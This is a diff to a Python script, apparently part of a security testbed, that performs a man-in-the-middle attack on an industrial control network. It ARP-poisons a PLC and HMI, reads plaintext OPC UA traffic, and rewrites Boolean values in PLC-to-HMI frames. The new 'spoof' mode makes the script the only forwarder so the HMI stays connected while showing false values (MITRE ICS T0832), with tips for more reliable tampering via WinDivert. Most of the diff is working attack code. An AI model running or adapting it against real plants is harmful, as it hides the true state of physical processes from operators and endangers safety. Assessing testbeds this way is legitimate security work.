@@ -4,31 +4,61 @@ tests/test_mitm_opcua_spoof.py
 MitM Attack: ARP Poison + OPC UA Plaintext Read/Spoof
 PLC (192.168.210.211:4840) <-> Attacker <-> HMI/Web-SCADA (192.168.210.31)
 
+MITRE ATT&CK for ICS:
+  - T0830 Adversary-in-the-Middle  (ky thuat: chen giua bang ARP poison)
+  - T0815 Denial of View           (hau qua che do DISRUPT: HMI mat hinh tam thoi)
+  - T0832 Manipulation of View     (hau qua che do SPOOF: HMI van chay nhung hien gia tri gia)
+
 Khac voi test_mitm_s7_spoof.py (S7CommPlus, ma hoa -- khong doc duoc noi dung):
 OPC UA tren testbed nay chay Anonymous/No-Security (da xac nhan qua
 OPCUA_UNAUTHORIZED_SESSION va OPCUA_CERTIFICATE_REJECTED deu NOT_CONFIGURED
 trong tests/day8/run_day8.py). Traffic la UA-TCP binary THUAN VAN BAN (khong
-ma hoa), nen dung o vi tri MITM co the vua DOC duoc gia tri that vua THU sua
-noi dung truoc khi forward cho HMI -- dung diem doi lap voi cho S7CommPlus
-bi ma hoa chan lai.
+ma hoa, khong chu ky toan ven vi SecurityMode=None), nen dung o vi tri MITM
+co the vua DOC duoc gia tri that vua SUA noi dung ma HMI khong phat hien --
+dung diem doi lap voi S7CommPlus bi ma hoa chan lai.
 
-QUAN TRONG - gioi han that cua script nay (khong phong dai):
-manipulate_opcua_payload() dung heuristic quet byte tim 1 Variant kieu
-Boolean (khong phai bo phan tich giao thuc day du). OPC UA khong lap lai ten
-tag ("BangTai") trong ReadResponse/PublishResponse, nen khong the tim theo
-ten tag bang pattern byte don gian -- chi tim duoc "1 gia tri Boolean nao do"
-trong khung MSG, co the trung hoac khong trung dung BangTai tuy vi tri thuc
-te trong response. modified_count la con so that duy nhat de biet co sua
-duoc gi khong; ban co the >0 ma khong phai dung field mong muon. Muon chinh
-xac hon: bat 1 phien PublishResponse that bang Wireshark, xac dinh offset
-that cua BangTai trong cau truc do, roi hardcode offset (giong cach
-test_mitm_s7_spoof.py da lam voi M5/M6/MD54 cho S7comm).
+============================================================================
+HAI CHE DO -- dat qua bien moi truong MITM_OPCUA_MODE:
+============================================================================
+  MITM_OPCUA_MODE=disrupt  (mac dinh, giong lan chay dau)
+    - Chi sniff + reinject ban da sua, DUA VAO IP forwarding cua OS de forward
+      ban goc. => moi goi PLC->HMI di 2 lan (goc + sua) => TCP loan => HMI treo.
+    - Ket qua: T0815 Denial of View (mat hinh tam thoi, tu hoi phuc).
+
+  MITM_OPCUA_MODE=spoof   (che do spoof SACH -- muc tieu T0832)
+    - Script la bo forward DUY NHAT: forward CA HAI chieu + CA MOI protocol
+      (khong chi 4840, de S7comm/WinCC van song), chi sua chieu PLC->HMI 4840.
+    - BAT BUOC tat IP forwarding trong che do nay (neu khong lai bi forward kep).
+    - Flip Boolean giu NGUYEN do dai => TCP sequence khong lech => co co hoi
+      HMI/web_scada van ket noi ma hien gia tri gia.
+
+CANH BAO THUC TE (khong phong dai) cho che do spoof:
+  scapy sniff+sendp bang Python tren Windows KHO theo kip ~2000 goi/giay. Neu
+  rot goi, TCP se retransmit va van co the treo. Cong cu MITM sua-noi-dung
+  nghiem tuc tren Windows dung WinDivert (pydivert) o tang kernel, khong dung
+  scapy. Neu che do spoof van treo, do la gioi han cua scapy tren Windows,
+  KHONG phai do khong the sua noi dung -- hay chuyen sang pydivert de kiem chung.
+
+CANH BAO ve muc tieu byte:
+manipulate_opcua_payload() dung heuristic quet tim 1 Variant Boolean dau tien
+(khong phai bo phan tich day du). OPC UA khong lap lai ten tag trong response,
+nen khong the tim theo ten "BangTai" bang pattern byte. modified_count>0 KHONG
+dam bao dung field BangTai. Muon chinh xac: bat 1 PublishResponse that bang
+Wireshark, xac dinh offset that cua BangTai, roi hardcode (giong cach
+test_mitm_s7_spoof.py lam voi M5/M6/MD54 cho S7comm).
+
+Con quan trong: OPC UA 4840 la kenh cua WEB_SCADA (opcua_gateway poll), khong
+phai cua WinCC (WinCC dung S7CommPlus). Vay spoof gia tri se hien tren DASHBOARD
+WEB-SCADA, khong phai tren WinCC. WinCC chi bi anh huong khi mang bi nhieu
+(che do disrupt).
 
 Yeu cau: pip install scapy, chay Admin (Windows) / sudo (Linux).
 
-Bat IP forwarding truoc (tranh DoS ngoai y muon):
-  Windows: netsh interface ipv4 set interface "Ethernet" forwarding=enabled
-  Linux:   echo 1 > /proc/sys/net/ipv4/ip_forward
+IP forwarding:
+  - che do disrupt: BAT (Windows: netsh interface ipv4 set interface "Ethernet"
+    forwarding=enabled ; Linux: echo 1 > /proc/sys/net/ipv4/ip_forward)
+  - che do spoof:   TAT (Windows: ...forwarding=disabled ; Linux: echo 0 > ...)
+    Script tu tat tren Linux; tren Windows ban phai tu tat truoc khi chay.
 """
 
 import sys
@@ -54,10 +84,18 @@ PLC_IP_CONF = PLC_IP
 HMI_IP_CONF = HMI_IP
 OPCUA_PORT  = 4840
 DURATION    = int(os.getenv("MITM_OPCUA_DURATION_S", "60"))
+# "disrupt" (mac dinh) = du IP forwarding OS + reinject -> forward kep -> Denial of View.
+# "spoof"             = script forward duy nhat, sua nguyen do dai -> muc tieu Manipulation of View.
+MODE        = os.getenv("MITM_OPCUA_MODE", "disrupt").strip().lower()
 
 stop_arp          = threading.Event()
 intercepted_count = 0
 modified_count    = 0
+
+# Dat trong main(), dung boi packet_callback o che do spoof (sole-forwarder).
+ATTACKER_MAC = None
+PLC_MAC      = None
+HMI_MAC      = None
 
 UA_MSG_TYPES = {b"HEL", b"OPN", b"MSG", b"CLO", b"ERR"}
 
@@ -198,19 +236,69 @@ def packet_callback(pkt, plc_ip, hmi_ip, iface):
             sendp(Ether(dst=plc_mac) / pkt[IP], iface=iface, verbose=False)
 
 
+def bridge_callback(pkt, plc_ip, hmi_ip, iface):
+    """Che do spoof: script la bo forward DUY NHAT (IP forwarding phai TAT).
+
+    Chi xu ly frame ARP-poison da chuyen HUONG TOI attacker (Ether.dst ==
+    ATTACKER_MAC) de tranh vong lap voi chinh goi minh vua ban ra. Forward
+    CA MOI protocol giua 2 host (khong chi 4840) de S7comm/WinCC van song;
+    chi sua noi dung chieu PLC->HMI tren cong 4840. Flip Boolean giu nguyen
+    do dai nen TCP sequence khong lech.
+    """
+    global intercepted_count
+
+    if not pkt.haslayer(Ether) or not pkt.haslayer(IP):
+        return
+    # Chi forward frame duoc chuyen huong toi ta; bo qua goi ta tu ban ra.
+    if pkt[Ether].dst != ATTACKER_MAC:
+        return
+    src_ip = pkt[IP].src
+    dst_ip = pkt[IP].dst
+    if {src_ip, dst_ip} != {plc_ip, hmi_ip}:
+        return
+
+    intercepted_count += 1
+    dst_mac = HMI_MAC if dst_ip == hmi_ip else PLC_MAC
+
+    new_pkt = pkt.copy()
+    is_opcua_plc_to_hmi = (
+        src_ip == plc_ip and dst_ip == hmi_ip
+        and pkt.haslayer(TCP) and pkt[TCP].sport == OPCUA_PORT
+        and pkt.haslayer(Raw)
+    )
+    if is_opcua_plc_to_hmi:
+        raw = bytes(pkt[Raw].load)
+        header = decode_ua_header(raw)
+        if header:
+            info(f"OPC UA {header['type']} PLC->HMI, {len(raw)}B (plaintext, decoded live)")
+        new_pkt[Raw].load = manipulate_opcua_payload(raw)  # giu nguyen do dai
+        del new_pkt[IP].chksum
+        if new_pkt.haslayer(TCP):
+            del new_pkt[TCP].chksum
+
+    new_pkt[Ether].src = ATTACKER_MAC
+    new_pkt[Ether].dst = dst_mac
+    sendp(new_pkt, iface=iface, verbose=False)
+
+
 # ── Main ──────────────────────────────────────────────────────────────────────
 def main():
-    global intercepted_count, modified_count
+    global intercepted_count, modified_count, ATTACKER_MAC, PLC_MAC, HMI_MAC
     intercepted_count = 0
     modified_count = 0
 
     plc_ip = PLC_IP_CONF
     hmi_ip = HMI_IP_CONF
     iface = IFACE
+    spoof_mode = (MODE == "spoof")
 
     print(f"\n{B}[TEST] MITM OPCUA PLAINTEXT SPOOF — Bang truyen AGF{X}")
-    info(f"PLC: {plc_ip}:{OPCUA_PORT}  HMI: {hmi_ip}  Duration: {DURATION}s")
+    info(f"PLC: {plc_ip}:{OPCUA_PORT}  HMI: {hmi_ip}  Duration: {DURATION}s  MODE: {MODE}")
     info("Doi lap voi test_mitm_s7_spoof.py: OPC UA khong ma hoa (Anonymous/No-Security)")
+    if spoof_mode:
+        info("SPOOF mode: script la bo forward duy nhat -- IP forwarding PHAI TAT.")
+    else:
+        info("DISRUPT mode (mac dinh): dua vao IP forwarding OS -- ket qua Denial of View.")
 
     changes = []
     observable = []
@@ -241,11 +329,23 @@ def main():
         ok(f"PLC MAC : {plc_mac}")
         ok(f"HMI MAC : {hmi_mac}")
 
-        if sys.platform.startswith("linux"):
-            os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
-            info("IP forwarding: ON")
+        ATTACKER_MAC = get_if_hwaddr(iface)
+        PLC_MAC = plc_mac
+        HMI_MAC = hmi_mac
+
+        if spoof_mode:
+            # Sole-forwarder: IP forwarding cua OS PHAI TAT (neu khong -> forward kep).
+            if sys.platform.startswith("linux"):
+                os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+                info("IP forwarding: OFF (spoof mode, script tu forward)")
+            else:
+                warn('Windows SPOOF mode: xac nhan da chay "netsh interface ipv4 set interface ... forwarding=disabled" TRUOC lenh nay')
         else:
-            warn('Windows: xac nhan da chay "netsh interface ipv4 set interface ... forwarding=enabled" TRUOC lenh nay')
+            if sys.platform.startswith("linux"):
+                os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+                info("IP forwarding: ON")
+            else:
+                warn('Windows DISRUPT mode: xac nhan da chay "netsh interface ipv4 set interface ... forwarding=enabled" TRUOC lenh nay')
 
         arp_thread = threading.Thread(
             target=arp_poison,
@@ -256,13 +356,19 @@ def main():
         ok("ARP Poison thread started")
         time.sleep(2)
 
-        filter_str = f"tcp port {OPCUA_PORT}"
+        if spoof_mode:
+            # Bat ca moi traffic giua 2 host de forward duy nhat, sua rieng 4840.
+            filter_str = f"host {plc_ip} and host {hmi_ip}"
+            cb = bridge_callback
+        else:
+            filter_str = f"tcp port {OPCUA_PORT}"
+            cb = packet_callback
         info(f"Sniffing [{filter_str}] for {DURATION}s ...")
         info("Wireshark filter: opcua || arp.duplicate-address-frame")
 
         sniff(
             filter=filter_str,
-            prn=lambda pkt: packet_callback(pkt, plc_ip, hmi_ip, iface),
+            prn=lambda pkt: cb(pkt, plc_ip, hmi_ip, iface),
             timeout=DURATION,
             store=False,
             iface=iface
@@ -293,18 +399,32 @@ def main():
 
     changes.append("Boolean Variant flip (heuristic, best-effort) trong 1 frame MSG PLC->HMI")
 
+    notes.append(f"MODE       : {MODE}")
+    notes.append("MITRE      : T0830 Adversary-in-the-Middle + " +
+                 ("T0832 Manipulation of View (muc tieu spoof)" if spoof_mode
+                  else "T0815 Denial of View (disrupt)"))
     notes.append(f"Duration   : {duration:.1f}s")
     notes.append(f"Intercepted: {intercepted_count} | Modified: {modified_count}")
     notes.append("Wireshark  : opcua || arp.duplicate-address-frame")
+    if spoof_mode:
+        notes.append(
+            "SPOOF mode: neu web_scada/HMI VAN KET NOI ma dashboard hien gia tri sai -> T0832 dat. "
+            "Neu van treo -> scapy tren Windows khong theo kip tang goi; chuyen sang pydivert/WinDivert "
+            "de kiem chung (gioi han thu vien, KHONG phai khong the sua noi dung)."
+        )
+    else:
+        notes.append(
+            "DISRUPT mode: forward kep (OS + reinject) lam TCP loan -> HMI treo tam thoi (T0815), "
+            "tu hoi phuc sau khi restore ARP. Muon spoof SACH: chay lai voi MITM_OPCUA_MODE=spoof "
+            "va TAT IP forwarding."
+        )
     notes.append(
-        "modified_count=0 nghia la khong tim thay pattern Boolean trong cua so quan sat "
-        "-- KHONG suy ra la khong the sua duoc noi dung, chi la heuristic chua khop lan nay. "
-        "modified_count>0 khong dam bao dung field BangTai -- xem module docstring."
+        "modified_count>0 khong dam bao dung field BangTai (heuristic Boolean dau tien) -- xem docstring. "
+        "OPC UA 4840 la kenh web_scada, KHONG phai WinCC (S7CommPlus): spoof hien tren dashboard web-scada."
     )
     notes.append(
-        "So sanh voi test_mitm_s7_spoof.py: neu intercepted_count o day cao (doc duoc plaintext "
-        "de dang) trong khi ban S7CommPlus chi thay hex tho, day la bang chung truc tiep cho thay "
-        "khong bat security policy OPC UA nguy hiem hon nhieu so voi S7CommPlus da ma hoa."
+        "So sanh voi test_mitm_s7_spoof.py: doc duoc plaintext de dang o day trong khi ban S7CommPlus "
+        "chi thay hex tho -> bang chung truc tiep khong bat security policy OPC UA nguy hiem hon S7CommPlus ma hoa."
     )
 
     success = intercepted_count > 0
